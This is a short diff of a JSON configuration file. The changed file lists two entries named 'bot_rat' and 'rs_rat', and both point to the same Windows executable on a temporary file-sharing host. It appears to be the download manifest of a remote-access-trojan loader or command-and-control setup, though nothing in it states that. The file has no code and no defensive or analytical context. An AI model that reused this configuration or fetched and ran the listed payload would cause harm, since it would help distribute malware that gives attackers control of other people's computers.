@@ -1,1 +1,1 @@
-{"links":["https://temp.sh/kugJS/d.exe"]}
+{"links":[{"agent-name":"bot_rat","url":"https://temp.sh/kugJS/d.exe","size":115}, {"agent-name":"rs_rat","url":"https://temp.sh/kugJS/d.exe","size":115}]}
